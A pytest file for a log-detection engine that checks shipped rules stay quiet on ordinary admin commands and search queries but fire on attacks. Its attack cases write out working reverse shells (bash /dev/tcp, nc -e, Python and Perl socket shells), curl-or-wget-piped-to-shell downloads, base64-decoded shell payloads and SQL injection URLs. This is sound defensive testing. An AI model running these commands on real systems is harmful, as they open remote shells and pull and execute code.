# tests/worker/test_rule_false_positives.py
"""Ordinary admin, developer and visitor activity must not raise the shipped
high/critical rules, and the attacks those rules exist for must still fire.

Each benign case used to match: "rsync -e ssh" read as "nc -e", "| sha256sum"
as "| sh", a socket health check as a Python reverse shell, "select ... from"
in a search box as SQL injection, a Jenkins build step as a webshell, a Go test
binary as a dropper."""
import asyncio
import glob
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../../worker"))

import pytest  # noqa: E402
import yaml  # noqa: E402

from worker.decoder_engine import DecoderEngine  # noqa: E402
from worker.sigma_engine import SigmaEngine  # noqa: E402

ROOT = os.path.join(os.path.dirname(__file__), "../..")

REVERSE = "Reverse Shell Or Bind Shell In A Command Line"
DOWNLOAD = "Download Piped Into A Shell Or Interpreter"
PYSHELL = "Python Or Perl Reverse Shell"
B64 = "Base64 Payload Decoded Into A Shell"
SQLI = "SQL Injection In A Web Request"
WEB_SHELL = "Web Server Started A Shell"
APP_SHELL = "Java Or Node App Started A Shell"
TEMP_EXEC = "Program Made Executable Or Run From A Temp Folder On Linux"


@pytest.fixture(scope="module")
def engines():
    load = lambda p: [open(f).read() for f in sorted(glob.glob(os.path.join(ROOT, p)))]  # noqa: E731
    dec = DecoderEngine()
    dec.load_from_yaml_list(sorted(load("decoders/*.yaml"), key=lambda c: yaml.safe_load(c).get("priority", 100)))
    sig = SigmaEngine()
    sig.load_from_yaml_list(load("rules/*.yaml"))
    assert not sig.load_errors, sig.load_errors
    return dec, sig


def _eval(sig, event):
    return {m["title"]: m["level"] for m in asyncio.run(sig.evaluate(event))}


def cmdline_alerts(engines, cmd):
    """A command line as sudo/cron/Sysmon-sourced decoders hand it on (process.command_line)."""
    _, sig = engines
    return _eval(sig, {"process.command_line": cmd, "log_type": "linux_sudo",
                       "raw_message": f"sudo: admin : COMMAND={cmd}", "hostname": "web-1"})


def exec_alerts(engines, image, cmd, parent="", comm=""):
    """An agent eBPF process-exec line, through the shipped decoder."""
    dec, sig = engines
    line = f'Image="{image}" CommandLine="{cmd}" PID=20 PPID=10 User=1000'
    if parent:
        line += f' ParentImage="{parent}"'
    if comm:
        line += f' Comm="{comm}"'
    event, _ = dec.decode_named("linux_process_exec", line)
    return _eval(sig, dict(event, raw_message=line, log_type="linux_process_exec", hostname="web-1"))


def web_alerts(engines, path, referrer="-"):
    dec, sig = engines
    ip = f"45.9.{len(path) % 250}.{sum(map(ord, path)) % 250 + 1}"  # one IP per request: no suppression
    line = (f'{ip} - - [20/Oct/2026:09:00:00 +0700] "GET {path} HTTP/1.1" 200 150 "{referrer}" '
            '"Mozilla/5.0 (X11; Linux x86_64)"')
    event = dec.decode("nginx_access_combined", line)
    return _eval(sig, dict(event, raw_message=line, log_type="nginx_access_combined"))


@pytest.mark.parametrize("cmd,title", [
    ("rsync -avz -e ssh /srv/www backup@10.0.0.5:/backup", REVERSE),
    ("/usr/bin/sync && func --list", REVERSE),
    ("curl -sL https://example.com/app.tar.gz | sha256sum", DOWNLOAD),
    ("curl -s https://api.example.com/x | jq . | shuf", DOWNLOAD),
    ("wget -qO- https://example.com/sums.txt | shasum -c", DOWNLOAD),
    ("python3 -c 'import socket; print(socket.gethostname())'", PYSHELL),
    ("/usr/bin/perl /usr/share/foo/check-system-health.pl", PYSHELL),
    ("perl -MFile::Copy -e 'copy(\"a\",\"b\")' /etc/Filesystem.conf", PYSHELL),
    ("echo dXNlcm5hbWVwYXNzd29yZDEyMzQ1 | base64", B64),
    ("echo YWRtaW46c3VwZXJzZWNyZXRwYXNz | base64 -d", B64),
    ("base64 -d backup.b64 | sha256sum", B64),
])
def test_ordinary_command_lines_stay_quiet(engines, cmd, title):
    assert title not in cmdline_alerts(engines, cmd)


@pytest.mark.parametrize("cmd,title", [
    ("bash -i >& /dev/tcp/203.0.113.9/4444 0>&1", REVERSE),
    ("nc -e /bin/sh 203.0.113.9 4444", REVERSE),
    ("/usr/bin/ncat 203.0.113.9 4444 -e /bin/bash", REVERSE),
    ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -l 4444 >/tmp/f", REVERSE),
    ("curl -fsSL http://203.0.113.9/x.sh | bash", DOWNLOAD),
    ("curl -s http://203.0.113.9/x | sudo sh", DOWNLOAD),
    ("curl http://203.0.113.9/p.py | python3 -", DOWNLOAD),
    ("wget -qO- http://203.0.113.9/x.sh | sh", DOWNLOAD),
    ("wget http://203.0.113.9/x.sh -O - | /bin/bash", DOWNLOAD),
    ("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
     "s.connect((\"203.0.113.9\",4444));os.dup2(s.fileno(),0);subprocess.call([\"/bin/sh\",\"-i\"])'", PYSHELL),
    ("python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", PYSHELL),
    ("perl -e 'use Socket;$i=\"203.0.113.9\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
     "if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");exec(\"/bin/sh -i\");};'", PYSHELL),
    ("echo Y3VybCBodHRwOi8vMjAzLjAuMTEzLjkveCB8IHNo | base64 -d | bash", B64),
    ("base64 --decode /tmp/p.b64 | sh", B64),
    ("bash -c \"$(echo aWQ7dW5hbWUgLWE= | base64 -d)\"", B64),
    ("eval $(echo aWQ= | base64 -d)", B64),
])
def test_attacks_still_fire(engines, cmd, title):
    assert title in cmdline_alerts(engines, cmd)


@pytest.mark.parametrize("path,referrer", [
    ("/search?q=select+a+plan+from+our+catalog", "-"),
    ("/blog/how-to-select-data-from-postgres", "-"),
    ("/", "https://www.google.com/search?q=select+best+laptop+from+list"),
    ("/products?sort=price&select=all+from+2024", "-"),
])
def test_plain_english_select_from_is_not_sql_injection(engines, path, referrer):
    assert SQLI not in web_alerts(engines, path, referrer)


@pytest.mark.parametrize("path", [
    "/item?id=1+AND+(SELECT+1+FROM+users)",
    "/item?id=1'+AND+(SELECT+COUNT(*)+FROM+users)>0--",
    "/item?id=1'+OR+SELECT+password+FROM+users",
    "/item?id=1;SELECT+pg_sleep(5)+FROM+x",
    "/item?id=-1+select+table_name+from+information_schema.tables",
    "/login?u=admin'--&q=select+password+from+users--",
    "/search?q=1%27%20UNION%20SELECT%20username,password%20FROM%20users--",
])
def test_sql_injection_still_fires(engines, path):
    assert SQLI in web_alerts(engines, path)


def test_web_servers_starting_a_shell_stay_critical(engines):
    got = exec_alerts(engines, "/bin/sh", "sh -c id", parent="/usr/sbin/apache2", comm="apache2")
    assert got.get(WEB_SHELL) == "critical" and APP_SHELL not in got


@pytest.mark.parametrize("cmd", ["sh -c id", "/bin/sh -c curl http://203.0.113.9/x|sh"])
def test_java_or_node_starting_a_shell_goes_to_triage_not_paging(engines, cmd):
    for runtime in ("/usr/bin/java", "/usr/bin/node"):
        got = exec_alerts(engines, "/bin/sh", cmd, parent=runtime)
        assert got.get(APP_SHELL) == "medium" and WEB_SHELL not in got, (runtime, got)


@pytest.mark.parametrize("cmd", [
    "sh -xe /var/lib/jenkins/workspace/app/script123.sh",
    "/bin/sh -xe /tmp/jenkins4512.sh",
])
def test_jenkins_build_steps_stay_quiet(engines, cmd):
    got = exec_alerts(engines, "/bin/sh", cmd, parent="/usr/bin/java")
    assert APP_SHELL not in got and WEB_SHELL not in got, got


@pytest.mark.parametrize("image", ["/tmp/go-build123/b001/exe/main", "/tmp/go-build998/b042/pkg.test"])
def test_go_toolchain_binaries_are_not_temp_droppers(engines, image):
    assert TEMP_EXEC not in exec_alerts(engines, image, image)


@pytest.mark.parametrize("image", ["/tmp/k", "/dev/shm/x", "/tmp/go-build1/evil", "/tmp/go-build1/b1/exe/sub/x"])
def test_programs_run_from_temp_still_fire(engines, image):
    assert TEMP_EXEC in exec_alerts(engines, image, image)
